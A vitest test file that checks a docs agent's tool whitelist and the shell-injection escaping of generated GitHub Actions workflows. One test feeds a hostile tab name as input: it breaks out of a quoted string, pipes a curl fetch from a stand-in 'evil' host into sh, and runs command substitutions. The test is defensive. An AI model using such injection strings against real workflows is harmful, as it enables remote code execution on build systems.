import { describe, it, expect } from 'vitest'
import { buildToolBridge } from '../tools.js'

describe('agent tool whitelist', () => {
  it('never exposes sync_from_repo (or other non-whitelisted tools) to the model', () => {
    const bridge = buildToolBridge('.')
    const names = bridge.claudeTools.map((tool) => tool.name)
    expect(names).not.toContain('sync_from_repo')
    expect(names).not.toContain('create_project')
    expect(names).toContain('update_page')
  })
})

describe('generated workflow shell-safety (Thally Track injection hardening)', () => {
  it('DOCS_AGENT_WORKFLOW passes dispatch values via env, never inline in the run script', async () => {
    const { DOCS_AGENT_WORKFLOW } = await import('../scaffold.js')
    // The instruction must be an env var, not expanded into the shell assignment.
    expect(DOCS_AGENT_WORKFLOW).toMatch(/INSTRUCTION:\s*\$\{\{\s*github\.event\.client_payload\.instruction/)
    expect(DOCS_AGENT_WORKFLOW).not.toMatch(/INSTRUCTION="\$\{\{/)
  })

  it('trackSenderWorkflow triggers on a merged PR and never inlines untrusted content', async () => {
    const { trackSenderWorkflow } = await import('../scaffold.js')
    const yaml = trackSenderWorkflow('acme/docs', { owner: 'acme', repo: 'api', outputTab: 'API Reference' })
    // Triggers on a merged pull_request, not a push.
    expect(yaml).toMatch(/on:\s*\n\s*pull_request:/)
    expect(yaml).toContain('github.event.pull_request.merged == true')
    // PR url + author flow through ENV; the run body references only the vars.
    expect(yaml).toMatch(/THALLY_PR_URL:\s*\$\{\{\s*github\.event\.pull_request\.html_url/)
    expect(yaml).not.toMatch(/from_pr\]=\$\{\{/)
    expect(yaml).not.toMatch(/requester\]=\$\{\{/)
    // No unescaped double-quotes around the tab that could break the assignment.
    expect(yaml).not.toContain('\\"API Reference\\"')
  })

  it('trackSenderWorkflow covers all preview actions + the loop guard, matching the webhook path', async () => {
    const { trackSenderWorkflow } = await import('../scaffold.js')
    const { AGENT_BRANCH_PREFIX, DOCS_PREVIEW_LABEL } = await import('@thallylabs/mcp/track')
    const yaml = trackSenderWorkflow('acme/docs', { owner: 'acme', repo: 'api' })
    // Fires on merges AND on opened/reopened/labeled/synchronize (preview) —
    // same action set the webhook honors, so Mode B and Mode C don't diverge.
    expect(yaml).toMatch(/types:\s*\[closed, labeled, synchronize, opened, reopened\]/)
    // Loop guard + preview label come from the shared constants (no drift).
    expect(yaml).toContain(`startsWith(github.event.pull_request.head.ref, '${AGENT_BRANCH_PREFIX}')`)
    expect(yaml).toContain(`contains(github.event.pull_request.labels.*.name, '${DOCS_PREVIEW_LABEL}')`)
  })

  it('trackSenderWorkflow bakes the same instruction prose as the webhook (single source) and escapes hostile config', async () => {
    const { trackSenderWorkflow } = await import('../scaffold.js')
    const { buildTrackInstruction } = await import('@thallylabs/mcp/track')
    const yaml = trackSenderWorkflow('acme/docs', { owner: 'acme', repo: 'api' })
    // The prose is buildTrackInstruction's, with the PR number as the runtime env
    // var — not a re-authored copy that can drift.
    const merged = buildTrackInstruction({ owner: 'acme', repo: 'api' }, { number: '${THALLY_PR_NUMBER}' as unknown as number })
    expect(yaml).toContain(`INSTRUCTION="${merged}"`)
    expect(yaml).toContain('An OPEN pull request in acme/api')

    // A tab name carrying shell metacharacters is escaped for the double-quoted
    // bash string — no unescaped quote/backtick/$ can break out or execute.
    const hostile = trackSenderWorkflow('acme/docs', { owner: 'acme', repo: 'api', outputTab: 'A" ; curl evil | sh; `id` $(id)' })
    expect(hostile).toContain('\\"')
    // The raw unescaped quote sequence must NOT survive into the bash string.
    expect(hostile).not.toContain('A" ;')
    expect(hostile).toContain('\\`id\\`')
    expect(hostile).toContain('\\$(id)')
  })
})
